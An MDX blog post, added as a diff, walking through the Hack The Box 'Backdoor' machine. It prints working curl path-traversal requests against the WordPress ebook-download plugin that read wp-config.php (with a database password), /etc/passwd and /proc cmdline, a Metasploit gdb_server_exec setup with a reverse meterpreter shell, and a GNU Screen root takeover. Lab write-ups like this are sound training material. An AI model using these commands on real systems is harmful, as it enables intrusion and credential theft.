@@ -1,0 +1,447 @@
+---
+title: Hackthebox Backdoor Writeup
+slug: hackthebox-backdoor-writeup
+description: In this machine we need to exploit the wordpress plugin called ebook-download to check the file inside server and find one process running gdbserver on port 1337 exploit that to get rev shell as user and for privexec abuse the GNU Screen 4.5.0 to get root.
+date: 2021-11-26
+image: hackthebox-backdoor-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ nmap -p 1-2000 -sC -sV -oA nmap/result 10.10.11.125
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-24 21:02 CST
+Nmap scan report for 10.10.11.125
+Host is up (0.081s latency).
+Not shown: 1997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.8.1
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Backdoor &#8211; Real-Life
+1337/tcp open  waste?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
+```
+
+There are three ports open `22:ssh,80:http,1337:waste(Interesting)`
+
+Let's start with enumerating port `1337` with `nc`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ netcat -vvv 10.10.11.125 1337
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+NCAT DEBUG: Using system default trusted CA certificates and those in /etc/ssl/certs/ca-certificates.crt.
+libnsock nsock_iod_new2(): nsock_iod_new (IOD #1)
+libnsock nsock_connect_tcp(): TCP connection requested to 10.10.11.125:1337 (IOD #1) EID 8
+libnsock nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.10.11.125:1337]
+Ncat: Connected to 10.10.11.125:1337.
+libnsock nsock_iod_new2(): nsock_iod_new (IOD #2)
+libnsock nsock_read(): Read request from IOD #1 [10.10.11.125:1337] (timeout: -1ms) EID 18
+libnsock nsock_readbytes(): Read request for 0 bytes from IOD #2 [peer unspecified] EID 26
+help
+libnsock nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 26 [peer unspecified] (5 bytes): help.
+libnsock nsock_write(): Write request for 5 bytes to IOD #1 EID 35 [10.10.11.125:1337]
+libnsock nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 35 [10.10.11.125:1337]
+libnsock nsock_readbytes(): Read request for 0 bytes from IOD #2 [peer unspecified] EID 42
+!help
+libnsock nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 42 [peer unspecified] (6 bytes): !help.
+libnsock nsock_write(): Write request for 6 bytes to IOD #1 EID 51 [10.10.11.125:1337]
+libnsock nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 51 [10.10.11.125:1337]
+libnsock nsock_readbytes(): Read request for 0 bytes from IOD #2 [peer unspecified] EID 58
+```
+
+Nothing `interesting` found in 1337 port
+
+## Port-80
+
+It's a `simple` WordPress page.
+
+<FixTheImageURL src='web.png' slug='hackthebox-backdoor-writeup' />
+
+We can `conform` that with footer
+
+<FixTheImageURL src='web1.png' slug='hackthebox-backdoor-writeup' />
+
+In `WordPress` website i first try to check if `directory` listing is enable or not.
+
+And we see when we go `wp-includes` we see all `files` in the server.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-backdoor-writeup' />
+
+Let's check if we list out the `plugins` directory. Go to `wp-content/plugins/`
+
+<FixTheImageURL src='web3.png' slug='hackthebox-backdoor-writeup' />
+
+We got the `ebook-download` plugin let's check the `readme.txt` inside that directory to check the `current` version of that `plugin`.
+
+<FixTheImageURL src='web4.png' slug='hackthebox-backdoor-writeup' />
+
+We got the version `1.1` let's check the `exploit` for that `specific` version.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-backdoor-writeup' />
+
+And we got the `exploit` for that `specific` version.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-backdoor-writeup' />
+
+Link : https://www.exploit-db.com/exploits/39575
+
+Let's first try to get the `wp-config.php` file with `curl` command.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+
+../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+
+/* That's all, stop editing! Happy blogging. */
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+define('ABSPATH', dirname(__FILE__) . '/');
+/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
+$currenthost = "http://".$_SERVER['HTTP_HOST'];
+$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
+$currentpath = preg_replace('/\/wp.+/','',$currentpath);
+define('WP_HOME',$currenthost.$currentpath);
+define('WP_SITEURL',$currenthost.$currentpath);
+define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
+define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
+define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
+@define('ADMIN_COOKIE_PATH', './');
+
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+<script>window.close()</script>
+```
+
+And it's work we got the `database` username and `password`.
+
+```js
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+/** MySQL database password */
+define('DB_PASSWORD', 'MQYBJSaD#DxG6qbm');
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+```
+
+Let's try this `creads` to login inside `wordpress` admin panel.
+
+<FixTheImageURL src='web7.png' slug='hackthebox-backdoor-writeup' />
+
+But it's `not working`.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-backdoor-writeup' />
+
+Let's try to get `/etc/passwd` file to check the users exist.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd
+/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+<script>window.close()</script>
+```
+
+There is one user called `user` let's try to get the `id_rsa` of that user.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/home/user/.ssh/id_rsa
+/home/user/.ssh/id_rsa/home/user/.ssh/id_rsa/home/user/.ssh/id_rsa<script>window.close()</script>
+```
+
+Let' check the `crontab`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/crontab
+/etc/crontab/etc/crontab/etc/crontab# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the crontab
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+Nothing `interesting`there after that i think let's enumerate the `proccess` running on server.
+
+Link : https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/
+
+We can check these file inside `proc/[pid]/` folder.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-backdoor-writeup' />
+
+I use `cmdline` to check the command running on that `process`.
+
+Let's use `wfuzz` to enumerate the `pid`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ wfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline
+Total requests: 1000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000825:   200        0 L      11 W       181 Ch      "825"
+000000823:   200        0 L      12 W       183 Ch      "823"
+000000843:   200        0 L      8 W        138 Ch      "843"
+000000942:   200        0 L      3 W        128 Ch      "942"
+
+Total time: 0
+Processed Requests: 1000
+Filtered Requests: 996
+Requests/sec.: 0
+```
+
+And we got `4` pid let's check first `825`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/825/cmdline --output test.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   181  100   181    0     0   1103      0 --:--:-- --:--:-- --:--:--  1096
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ cat test.txt
+/proc/825/cmdline/proc/825/cmdline/proc/825/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;";
+```
+
+And we see `gdbserver` is running on port `1337` which nmap said `waste` let's check the `exploit` for that.
+
+Link : https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/
+
+Let's use `msfconsole` for getting shell in `machine`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Backdoor]
+└──╼ [★]$ msfdb run
+[i] Database already started
+
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit!                  ;@'. __*__,."    \|--- _____________/
+                  '(.,...."/
+
+
+       =[ metasploit v6.0.37-dev                          ]
++ -- --=[ 2111 exploits - 1136 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up
+to a file, use the makerc command
+
+msf6 > use exploit/multi/gdb/gdb_server_exec
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/gdb/gdb_server_exec) > set RHOSTS 10.10.11.125
+RHOSTS => 10.10.11.125
+msf6 exploit(multi/gdb/gdb_server_exec) > set RPORT 1337
+RPORT => 1337
+msf6 exploit(multi/gdb/gdb_server_exec) > set lhost tun0
+lhost => tun0
+```
+
+After configuring the `msfconsole` let's run that.
+
+And we got the shell as `user` and get the `user.txt`.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-backdoor-writeup' />
+
+## Privilege escalation
+
+Now let's run `linPEAS`.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-backdoor-writeup' />
+
+It's running `GNU Screen` as root we can switch our `screen` to `root` let's try that out.
+
+```js
+screen -x root/root
+```
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-backdoor-writeup' />
+
+Now we are `root` user let's get the `root.txt` file.
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-backdoor-writeup' />
+
+## Second Method For Privilege escalation
+
+Link : https://www.youtube.com/watch?v=RP4hAC96VxQ
